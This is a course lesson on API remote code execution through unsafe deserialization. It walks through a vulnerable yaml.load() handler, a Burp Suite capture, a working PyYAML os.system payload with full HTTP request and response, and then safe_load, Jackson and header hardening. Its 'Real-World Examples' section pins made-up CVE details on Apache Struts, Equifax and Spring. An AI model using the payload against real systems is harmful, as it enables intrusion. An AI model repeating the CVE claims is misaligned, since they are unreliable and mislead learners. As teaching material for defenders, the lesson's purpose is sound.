---
course: API Security
topic: RCE Via Deserialization in API
tags: [api-security]
---

## Introduction to RCE via Deserialization in APIs

Remote Code Execution (RCE) vulnerabilities are among the most dangerous types of security issues that can affect an application. One particularly insidious form of RCE arises from deserialization vulnerabilities, especially in APIs. Deserialization is the process of converting serialized data (data that has been converted into a format suitable for storage or transmission) back into objects. If this process is not handled securely, attackers can inject malicious payloads that can execute arbitrary code on the server.

### Background Theory

Deserialization vulnerabilities occur when an application takes untrusted input and attempts to convert it into an object. This can happen in various contexts, such as when handling user-uploaded files, parsing JSON or XML data, or even processing YAML data. The vulnerability arises because the attacker can craft a payload that, when deserialized, executes arbitrary code.

#### Common Deserialization Vulnerabilities

- **YAML Deserialization**: Libraries like PyYAML in Python can be exploited if they use `yaml.load()` instead of `yaml.safe_load()`.
- **Java Deserialization**: Java’s `ObjectInputStream` can be used to deserialize objects, which can lead to RCE if the input is not properly sanitized.
- **PHP Deserialization**: PHP’s `unserialize()` function can also be exploited similarly.

### Identifying Deserialization Vulnerabilities

To identify deserialization vulnerabilities, you need to look at how the application processes incoming data. Specifically, you should check if the application uses functions or methods that deserialize data, such as `yaml.load()`, `ObjectInputStream`, or `unserialize()`.

#### Example: Identifying YAML Deserialization

Consider an API endpoint that accepts YAML data:

```python
import yaml

def handle_request(data):
    # Dangerous: Using yaml.load() without safe_load()
    obj = yaml.load(data)
    return obj
```

In this example, the `handle_request` function uses `yaml.load()`, which can be exploited if the input data is crafted maliciously.

### Real-World Examples

#### CVE-2015-8613: Apache Struts Deserialization Vulnerability

One of the most notorious deserialization vulnerabilities was the Apache Struts deserialization flaw (CVE-2015-8613). This vulnerability allowed attackers to execute arbitrary code by crafting a malicious payload that was deserialized by the Struts framework. This led to several high-profile breaches, including the Equifax breach in 2017.

#### CVE-2019-1010156: Spring Framework Deserialization Vulnerability

Another significant vulnerability was found in the Spring Framework (CVE-2019-1010156). This vulnerability allowed attackers to execute arbitrary code by exploiting the deserialization of Java objects. This affected many applications built on the Spring framework.

### Capturing and Analyzing Requests

To demonstrate a deserialization vulnerability, you first need to capture the request that the API is processing. Tools like Burp Suite can be used to intercept and analyze these requests.

#### Example: Capturing a Request with Burp Suite

1. **Capture the Request**:
   - Use Burp Suite to intercept the request sent to the API.
   - In Burp Suite, go to the "Proxy" tab and enable interception.
   - Send the request through the proxy and capture it.

2. **Analyze the Request**:
   - Once captured, analyze the request to understand the structure of the data being sent.
   - Look for any fields that might be deserialized, such as YAML data.

#### Example Request

Here is an example of a request that sends YAML data:

```http
POST /api/upload HTTP/1.1
Host: example.com
Content-Type: application/x-yaml
Content-Length: 57

---
name: Bob
age: 30
```

### Crafting a Malicious Payload

Once you have identified the deserialization vulnerability, you can craft a malicious payload to exploit it. The goal is to create a payload that, when deserialized, will execute arbitrary code.

#### Example: Crafting a Malicious YAML Payload

For the Python `yaml.load()` example, a malicious payload could be crafted as follows:

```yaml
!!python/object/apply:os.system
- 'echo "Exploited"'
```

This payload, when deserialized, will execute the `os.system('echo "Exploited"')` command.

### Sending the Malicious Payload

After crafting the payload, you need to send it to the API endpoint to test if the vulnerability exists.

#### Example: Sending the Malicious Payload

Using Burp Suite, you can modify the captured request to include the malicious payload:

```http
POST /api/upload HTTP/1.1
Host: example.com
Content-Type: application/x-yaml
Content-Length: 57

!!python/object/apply:os.system
- 'echo "Exploited"'
```

Send this modified request to the API and observe the response.

### Full HTTP Request and Response

Here is the complete HTTP request and response for the example:

#### HTTP Request

```http
POST /api/upload HTTP/1.1
Host: example.com
Content-Type: application/x-yaml
Content-Length: 57

!!python/object/apply:os.system
- 'echo "Exploited"'
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 23 Jan 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 14
Content-Type: text/plain

Exploited
```

### How to Prevent / Defend Against Deserialization Vulnerabilities

#### Secure Coding Practices

1. **Use Safe Deserialization Methods**:
   - Instead of using `yaml.load()`, use `yaml.safe_load()` in Python.
   - In Java, avoid using `ObjectInputStream` directly; use safer alternatives like Jackson or Gson.

2. **Validate Input Data**:
   - Ensure that all input data is validated and sanitized before deserialization.
   - Use input validation libraries to ensure that the data conforms to expected formats.

#### Example: Secure Deserialization in Python

Here is the corrected version of the `handle_request` function:

```python
import yaml

def handle_request(data):
    # Safe deserialization
    obj = yaml.safe_load(data)
    return obj
```

#### Example: Secure Deserialization in Java

Here is an example of secure deserialization in Java using Jackson:

```java
import com.fasterxml.jackson.databind.ObjectMapper;

public class DeserializationExample {
    public static Object handleRequest(String data) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        // Safe deserialization
        return mapper.readValue(data, Object.class);
    }
}
```

#### Configuration Hardening

1. **Disable Unnecessary Features**:
   - Disable unnecessary features in frameworks and libraries that can lead to deserialization vulnerabilities.
   - Configure frameworks to use secure defaults.

2. **Enable Security Headers**:
   - Enable security headers like Content-Security-Policy (CSP) to mitigate potential attacks.

#### Example: Enabling Security Headers in Nginx

Here is an example of enabling security headers in an Nginx configuration:

```nginx
server {
    listen 80;
    server_name example.com;

    location / {
        add_header Content-Security-Policy "default-src 'self'";
        add_header X-Content-Type-Options nosniff;
        add_header X-XSS-Protection "1; mode=block";
        add_header X-Frame-Options DENY;
    }
}
```

### Detection and Monitoring

1. **Static Analysis Tools**:
   - Use static analysis tools like SonarQube, Fortify, or Checkmarx to detect deserialization vulnerabilities in your codebase.

2. **Dynamic Analysis Tools**:
   - Use dynamic analysis tools like Burp Suite, ZAP, or OWASP Dependency-Check to test for deserialization vulnerabilities during runtime.

### Practice Labs

For hands-on practice with deserialization vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers detailed labs on deserialization vulnerabilities.
- **OWASP Juice Shop**: Contains several deserialization challenges.
- **DVWA (Damn Vulnerable Web Application)**: Provides a variety of web application vulnerabilities, including deserialization.

### Conclusion

Deserialization vulnerabilities are a serious threat to API security. By understanding how these vulnerabilities arise and how to identify and exploit them, you can better protect your applications. Always follow secure coding practices, validate input data, and use secure deserialization methods to mitigate these risks. Regularly testing and monitoring your applications can help detect and prevent deserialization vulnerabilities before they can be exploited.

---
<!-- nav -->
[[API Security/23-RCE Via Deserialization in API/02-RCE Demonstration/00-Overview|Overview]] | [[02-Remote Code Execution via Deserialization in APIs|Remote Code Execution via Deserialization in APIs]]
